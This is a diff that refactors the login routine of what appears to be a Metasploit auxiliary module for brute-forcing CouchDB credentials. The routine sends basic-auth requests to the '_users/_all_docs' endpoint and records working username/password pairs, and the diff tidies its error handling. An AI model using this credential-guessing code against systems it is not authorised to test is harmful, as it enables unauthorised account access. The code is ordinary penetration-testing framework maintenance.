@@ -101,38 +101,38 @@ class MetasploitModule < Msf::Auxiliary
 
   def do_login(user, pass)
     vprint_status("Trying username:'#{user}' with password:'#{pass}'")
-    begin
 
-      uri = target_uri.path
-      res = send_request_cgi(
-      {
-        'uri'       => normalize_uri(uri, '_users/_all_docs'),
-        'method'    => 'GET',
-        'ctype'     => 'text/plain',
-        'authorization' => basic_auth(user, pass)
-      })
+    res = send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, '_users/_all_docs'),
+      'method' => 'GET',
+      'ctype' => 'text/plain',
+      'authorization' => basic_auth(user, pass)
+    })
 
-      if res and res.code != 200
-        return :skip_pass
-      else
-        vprint_good("#{rhost}:#{rport} - Successful login with. '#{user}' : '#{pass}'")
-        report_cred(
-          ip: datastore['RHOST'],
-          port: datastore['RPORT'],
-          service_name: 'couchdb',
-          user: user,
-          password: pass,
-          proof: res.code.to_s
-        )
-        return :next_user
-      end
-
-    rescue ::Rex::ConnectionError, ::Errno::ECONNREFUSED, ::Errno::ETIMEDOUT
-      print_error("HTTP Connection Failed, Aborting")
-        return :abort
+    unless res
+      print_error('HTTP connection failed, aborting')
+      return :abort
     end
-    rescue ::Exception => e
-      print_error("Error: #{e.to_s}")
-      return nil
+
+    return :skip_pass unless res.code == 200
+
+    print_good("#{peer} - Successful login with: '#{user}' : '#{pass}'")
+
+    report_cred(
+      ip: rhost,
+      port: rport,
+      service_name: 'couchdb',
+      user: user,
+      password: pass,
+      proof: res.code.to_s
+    )
+
+    :next_user
+  rescue ::Rex::ConnectionError, ::Errno::ECONNREFUSED, ::Errno::ETIMEDOUT
+    print_error('HTTP connection failed, aborting')
+    return :abort
+  rescue => e
+    print_error("Error: #{e}")
+    return nil
   end
 end
